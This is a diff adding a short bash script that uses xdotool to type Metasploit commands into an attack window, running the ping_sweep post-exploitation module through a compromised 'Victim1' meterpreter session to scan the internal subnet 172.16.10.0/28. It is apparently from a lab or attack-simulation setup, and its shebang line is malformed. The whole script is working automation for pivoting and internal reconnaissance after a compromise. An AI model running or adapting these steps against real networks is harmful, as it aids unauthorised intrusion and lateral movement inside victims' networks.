@@ -1,0 +1,24 @@
+!/bin/bash
+###############################
+# Script to scan other networks via Reverse Shell (Victim1 session)
+# The commands using metasploit are
+# exit                                  <--- exit Windows shell and go back to meterpreter
+# background                            <--- go back to msf shell
+# use post/multi/gather/ping_sweep      <--- configure pivot attack network scan via ping
+# set RHOSTS 172.16.10.0/28             <--- internal subnet to scan via Victim1
+# set SESSION 1                         <--- use session of the Victim1
+###############################
+
+echo "Wait for the end of Network Scan script..."
+
+xdotool windowactivate `cat /tmp/attack_window`
+xdotool type --window `cat /tmp/attack_window` --delay 100 "use post/multi/gather/ping_sweep"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "set RHOSTS 172.16.10.0/28"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "set SESSION 1"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "run"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 2
+
+echo "Network Scan in progress..."
